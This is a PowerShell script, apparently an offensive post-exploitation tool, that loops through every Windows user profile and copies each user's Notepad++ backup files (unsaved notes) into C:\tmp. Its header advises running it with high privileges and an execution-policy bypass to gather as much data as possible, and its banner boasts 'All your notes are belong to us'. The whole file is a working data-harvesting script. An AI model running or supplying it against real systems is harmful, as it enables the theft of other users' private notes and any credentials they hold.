<#
.DESCRIPTION
    Loops through all users in C:\Users and extracts roaming Notepad++ files. 
    Needless to say the script should to be run as a *high privileged user* to get as much information as possible.

.EXAMPLE
    PS C:\tmp> powershell.exe -executionpolicy bypass .\notepad_extract.ps1

	[+] Extracting Notepad++ data from 'Legit-User' to: C:\tmp\Legit-User
	[+] Extracting Notepad++ data from 'DjKhaled' to: C:\tmp\DjKhaled
	[+] Extracting Notepad++ data from 'AnotherOne' to: C:\tmp\AnotherOne
	[-] 'Public' doesn't have any roaming Notepad++ data.

.NOTES
    Author: 0xPThree @ Exploit.se
    Date: 2024-05-16
    Version: 1.0
#>

$banner = @"
      __  ___  ___  __        __       __              __  
|\ | /  \  |  |__  |__)  /\  |  \     |  \ |  |  |\/| |__) 
| \| \__/  |  |___ |    /~~\ |__/ ___ |__/ \__/  |  | |    
                                                           
"All your notes are belong to us"
"@
Write-Host $banner

try {
    $rootDirectory = "C:\Users"
    $destinationRootDirectory = "C:\tmp"
    $found = $false

    Get-ChildItem $rootDirectory -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        $username = $_.Name
        $backupDirectory = Join-Path -Path $_.FullName -ChildPath "AppData\Roaming\Notepad++\backup"

        if (Test-Path $backupDirectory) {
            $backupItemCount = @(Get-ChildItem -Path $backupDirectory -Recurse -File).Count
            if ($backupItemCount -gt 0) {
                $found = $true
                $destinationDirectory = Join-Path -Path $destinationRootDirectory -ChildPath $username
                New-Item -ItemType Directory -Path $destinationDirectory -Force -ErrorAction SilentlyContinue | Out-Null
                Copy-Item -Path "$backupDirectory\*" -Destination $destinationDirectory -Recurse -Force
                Write-Host "[+] Extracting Notepad++ data from '$username' to: $destinationDirectory" -ForegroundColor DarkGreen
            } else {
                Write-Host "[-] '$username' doesn't have any roaming Notepad++ data." -ForegroundColor DarkYellow
            }
        } else {
            Write-Host "[-] '$username' doesn't have any roaming Notepad++ data." -ForegroundColor DarkYellow
        }
    }

    if (-not $found) { Write-Host "[!] No backup directories found under $rootDirectory." -ForegroundColor DarkRed }
} catch { Write-Host "An error occurred: $_" -ForegroundColor DarkRed }
